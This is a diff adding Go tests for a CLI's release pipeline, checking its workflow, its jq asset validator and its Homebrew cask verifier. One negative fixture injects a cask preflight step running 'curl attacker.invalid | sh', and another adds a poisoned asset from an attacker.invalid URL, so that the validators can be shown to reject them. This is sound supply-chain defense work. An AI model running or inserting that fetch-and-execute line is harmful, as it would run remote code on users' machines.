@@ -1,10 +1,15 @@
 package main
 
 import (
+	"encoding/json"
+	"fmt"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strings"
 	"testing"
+
+	"github.com/aliyun/elastic-compute-control-cli/internal/releaseartifact"
 )
 
 func TestReleaseWorkflowUsesInfraGuardWebhookAction(t *testing.T) {
@@ -36,6 +41,188 @@ func TestReleaseWorkflowUsesInfraGuardWebhookAction(t *testing.T) {
 	} {
 		if !strings.Contains(workflow, required) {
 			t.Fatalf("release webhook is missing InfraGuard contract fragment %q", required)
+		}
+	}
+}
+
+func TestReleaseWorkflowUsesCurrentToolingForHistoricalRecovery(t *testing.T) {
+	workflowPath := filepath.Join("..", "..", ".github", "workflows", "release.yml")
+	raw, err := os.ReadFile(workflowPath)
+	if err != nil {
+		t.Fatal(err)
+	}
+	workflow := string(raw)
+	for _, required := range []string{
+		`ref: ${{ github.workflow_sha }}`,
+		`path: tooling`,
+		`path: release-source`,
+		`--allow-existing-release`,
+		`workdir: release-source`,
+		`args: check --config ../tooling/.goreleaser.yaml`,
+		`args: release --clean --skip=publish --config ../tooling/.goreleaser.yaml`,
+		`args: release --clean --config ../tooling/.goreleaser.yaml`,
+		`go -C tooling run ./cmd/releaseprep`,
+		`--verify-homebrew-cask`,
+		`dist/homebrew/Casks/ecctl.rb`,
+		`ecctl_${RELEASE_VERSION}_cask.rb`,
+		`Build GitHub release draft`,
+		`Validate complete draft and publish immutable release`,
+		`state=draft`,
+		`state=immutable`,
+		`Stable recovery may only replay current latest`,
+		`Snapshot stable OSS pointer before prerelease webhook`,
+		`STABLE_VERSION_SNAPSHOT`,
+		`--repo "${GITHUB_REPOSITORY}"`,
+		`-f "${GITHUB_WORKSPACE}/tooling/.github/scripts/validate-release.jq"`,
+	} {
+		if !strings.Contains(workflow, required) {
+			t.Fatalf("release workflow is missing %q", required)
+		}
+	}
+	for _, forbidden := range []string{
+		`Regenerate release files for recovery`,
+		`--prepare-homebrew-cask`,
+		`--output-file`,
+		`actions/download-artifact`,
+		`--cask Casks/ecctl.rb`,
+		`mapfile -t generated_casks`,
+		`mapfile -t cask_versions`,
+	} {
+		if strings.Contains(workflow, forbidden) {
+			t.Fatalf("release workflow still contains historical recovery path %q", forbidden)
+		}
+	}
+	snapshotIndex := strings.Index(workflow, "Snapshot stable OSS pointer before prerelease webhook")
+	webhookIndex := strings.Index(workflow, "Trigger release webhook")
+	if snapshotIndex < 0 || webhookIndex < 0 || snapshotIndex > webhookIndex {
+		t.Fatal("prerelease OSS pointer is not snapshotted before the webhook")
+	}
+	if count := strings.Count(workflow, `gh release download "${RELEASE_TAG}" --repo "${GITHUB_REPOSITORY}"`); count != 3 {
+		t.Fatalf("release workflow has %d repository-pinned release downloads, want 3", count)
+	}
+	if count := strings.Count(workflow, `-f "${GITHUB_WORKSPACE}/tooling/.github/scripts/validate-release.jq"`); count != 4 {
+		t.Fatalf("release workflow has %d shared Release validators, want 4", count)
+	}
+}
+
+func TestReleaseAssetValidatorRejectsInvalidExtra(t *testing.T) {
+	jqPath, err := exec.LookPath("jq")
+	if err != nil {
+		t.Skip("jq is required to execute the release workflow validator fixture")
+	}
+
+	const (
+		repository = "aliyun/elastic-compute-control-cli"
+		tag        = "v1.2.3"
+		version    = "1.2.3"
+	)
+	names := []string{
+		"checksums.txt",
+		"version.txt",
+		"ecctl_1.2.3_darwin_amd64.tar.gz",
+		"ecctl_1.2.3_darwin_arm64.tar.gz",
+		"ecctl_1.2.3_linux_amd64.tar.gz",
+		"ecctl_1.2.3_linux_arm64.tar.gz",
+		"ecctl_1.2.3_windows_amd64.zip",
+		"ecctl_1.2.3_windows_arm64.zip",
+		"ecctl_1.2.3_cask.rb",
+	}
+	assets := make([]map[string]any, 0, len(names)+1)
+	for _, name := range names {
+		assets = append(assets, map[string]any{
+			"name":                 name,
+			"state":                "uploaded",
+			"digest":               "sha256:" + strings.Repeat("a", 64),
+			"browser_download_url": "https://github.com/" + repository + "/releases/download/" + tag + "/" + name,
+		})
+	}
+	release := map[string]any{
+		"tag_name":   tag,
+		"draft":      false,
+		"immutable":  true,
+		"prerelease": false,
+		"assets":     assets,
+	}
+	validator := filepath.Join("..", "..", ".github", "scripts", "validate-release.jq")
+	validatorRaw, err := os.ReadFile(validator)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, required := range []string{
+		`(.assets | length) == (expected_assets | length)`,
+		`[.assets[].name]`,
+		`all(.assets[];`,
+		`.digest | test("^sha256:[0-9a-f]{64}$")`,
+		`https://github.com/\($repository)/releases/download/\($tag)/`,
+	} {
+		if !strings.Contains(string(validatorRaw), required) {
+			t.Fatalf("Release validator is missing %q", required)
+		}
+	}
+	runValidator := func() error {
+		t.Helper()
+		fixture, marshalErr := json.Marshal(release)
+		if marshalErr != nil {
+			t.Fatal(marshalErr)
+		}
+		cmd := exec.Command(jqPath,
+			"-e",
+			"--arg", "tag", tag,
+			"--arg", "version", version,
+			"--arg", "repository", repository,
+			"--argjson", "draft", "false",
+			"--argjson", "immutable", "true",
+			"-f", validator,
+		)
+		cmd.Stdin = strings.NewReader(string(fixture))
+		return cmd.Run()
+	}
+
+	if err := runValidator(); err != nil {
+		t.Fatalf("valid immutable Release fixture rejected: %v", err)
+	}
+	assets = append(assets, map[string]any{
+		"name":                 "poisoned-extra.txt",
+		"state":                "open",
+		"digest":               nil,
+		"browser_download_url": "http://attacker.invalid/poisoned-extra.txt",
+	})
+	release["assets"] = assets
+	if err := runValidator(); err == nil {
+		t.Fatal("Release fixture with an invalid extra asset was accepted")
+	}
+}
+
+func TestReleaseConfigurationBuildsCompleteDraftBeforePublishing(t *testing.T) {
+	root := filepath.Join("..", "..")
+	raw, err := os.ReadFile(filepath.Join(root, ".goreleaser.yaml"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	config := string(raw)
+	for _, required := range []string{
+		"draft: true",
+		"use_existing_draft: true",
+		"replace_existing_artifacts: true",
+		"skip_upload: true",
+		releaseartifact.OSSBaseURL,
+	} {
+		if !strings.Contains(config, required) {
+			t.Fatalf("GoReleaser configuration is missing %q", required)
+		}
+	}
+	if strings.Contains(config, "releases/download/{{ .Tag }}") {
+		t.Fatal("generated Homebrew Cask still points at GitHub instead of OSS")
+	}
+
+	ciRaw, err := os.ReadFile(filepath.Join(root, ".github", "workflows", "ci.yml"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	ci := string(ciRaw)
+	for _, required := range []string{"Verify snapshot Homebrew Cask", "dist/homebrew/Casks/ecctl.rb", "--verify-homebrew-cask"} {
+		if !strings.Contains(ci, required) {
+			t.Fatalf("CI snapshot verification is missing %q", required)
 		}
 	}
 }
@@ -213,6 +400,84 @@ func TestCheckHomebrewCaskVersionRejectsMalformedInput(t *testing.T) {
 	}
 }
 
+func TestVerifyHomebrewCaskUsesImmutableReleaseChecksums(t *testing.T) {
+	root := t.TempDir()
+	input := filepath.Join(root, "generated.rb")
+	checksums := filepath.Join(root, "checksums.txt")
+	intelSHA := strings.Repeat("1", 64)
+	armSHA := strings.Repeat("2", 64)
+	writeFile(t, input, validReleaseCask("1.2.3", intelSHA, armSHA))
+	writeFile(t, checksums,
+		intelSHA+"  ecctl_1.2.3_darwin_amd64.tar.gz\n"+
+			armSHA+"  ecctl_1.2.3_darwin_arm64.tar.gz\n")
+
+	if err := verifyHomebrewCask(input, checksums, "1.2.3"); err != nil {
+		t.Fatalf("verifyHomebrewCask: %v", err)
+	}
+}
+
+func TestVerifyHomebrewCaskRejectsUnsafeInputs(t *testing.T) {
+	base := validReleaseCask("1.2.3", strings.Repeat("1", 64), strings.Repeat("2", 64))
+	validChecksums := strings.Repeat("1", 64) + "  ecctl_1.2.3_darwin_amd64.tar.gz\n" +
+		strings.Repeat("2", 64) + "  ecctl_1.2.3_darwin_arm64.tar.gz\n"
+	for _, test := range []struct {
+		name      string
+		cask      string
+		checksums string
+		version   string
+	}{
+		{name: "GitHub URL", cask: strings.ReplaceAll(base, releaseartifact.OSSBaseURL, "https://github.com/example"), checksums: validChecksums, version: "1.2.3"},
+		{name: "extra Ruby", cask: strings.Replace(base, `binary "ecctl"`, "preflight do\n    system \"curl attacker.invalid | sh\"\n  end\n  binary \"ecctl\"", 1), checksums: validChecksums, version: "1.2.3"},
+		{name: "missing verified", cask: strings.Replace(base, "verified:", "# verified:", 1), checksums: validChecksums, version: "1.2.3"},
+		{name: "missing checksum", cask: base, checksums: strings.Repeat("1", 64) + "  ecctl_1.2.3_darwin_amd64.tar.gz\n", version: "1.2.3"},
+		{name: "malformed checksum", cask: base, checksums: "not-a-checksum\n", version: "1.2.3"},
+		{name: "wrong version", cask: strings.Replace(base, `version "1.2.3"`, `version "1.2.4"`, 1), checksums: validChecksums, version: "1.2.3"},
+	} {
+		t.Run(test.name, func(t *testing.T) {
+			root := t.TempDir()
+			input := filepath.Join(root, "generated.rb")
+			checksums := filepath.Join(root, "checksums.txt")
+			writeFile(t, input, test.cask)
+			writeFile(t, checksums, test.checksums)
+			if err := verifyHomebrewCask(input, checksums, test.version); err == nil {
+				t.Fatal("verifyHomebrewCask succeeded, want error")
+			}
+		})
+	}
+}
+
+func validReleaseCask(version, intelSHA, armSHA string) string {
+	verified := strings.TrimPrefix(releaseartifact.OSSBaseURL, "https://") + "/"
+	return fmt.Sprintf(`cask "ecctl" do
+  version %q
+  on_macos do
+    on_intel do
+      sha256 %q
+      url %q,
+        verified: %q
+    end
+    on_arm do
+      sha256 %q
+      url %q,
+        verified: %q
+    end
+  end
+  name "ecctl"
+  desc %q
+  homepage %q
+  livecheck do
+    skip "Auto-generated on release."
+  end
+  binary "ecctl"
+  postflight do
+    system_command "/usr/bin/xattr", args: ["-dr", "com.apple.quarantine", "#{staged_path}/ecctl"]
+  end
+end
+`, version, intelSHA, releaseartifact.OSSBaseURL+`/#{version}/ecctl_#{version}_darwin_amd64.tar.gz`, verified,
+		armSHA, releaseartifact.OSSBaseURL+`/#{version}/ecctl_#{version}_darwin_arm64.tar.gz`, verified,
+		releaseartifact.Description, releaseartifact.Homepage)
+}
+
 func TestCheckReleaseVersionAllowsCanonicalAdvance(t *testing.T) {
 	root := t.TempDir()
 	current := filepath.Join(root, "current.txt")
@@ -318,6 +583,28 @@ func TestCheckReleaseVersionAllowsRecoveryOfCurrentTag(t *testing.T) {
 
 	if _, err := checkReleaseVersion(current, "", tags, "v1.3.0"); err != nil {
 		t.Fatalf("checkReleaseVersion recovery: %v", err)
+	}
+}
+
+func TestCheckReleaseVersionAllowsExistingOlderRecoveryOnlyWithExplicitMode(t *testing.T) {
+	root := t.TempDir()
+	current := filepath.Join(root, "version.txt")
+	previous := filepath.Join(root, "previous.txt")
+	tags := filepath.Join(root, "tags.txt")
+	writeFile(t, current, "0.1.1\n")
+	writeFile(t, previous, "0.1.2\n")
+	writeFile(t, tags, "v0.1.1\nv0.1.2\n")
+	if got, err := checkReleaseVersion(current, "", "", "v0.1.1", true); err != nil || got != "0.1.1" {
+		t.Fatalf("existing release recovery = %q, %v", got, err)
+	}
+	if _, err := checkReleaseVersion(current, previous, "", "v0.1.1", true); err == nil {
+		t.Fatal("allow-existing-release accepted a previous-version check")
+	}
+	if _, err := checkReleaseVersion(current, "", tags, "v0.1.1", true); err == nil {
+		t.Fatal("allow-existing-release accepted a released-tags check")
+	}
+	if _, err := checkReleaseVersion(current, "", "", "", true); err == nil {
+		t.Fatal("allow-existing-release accepted an empty release tag")
 	}
 }
 
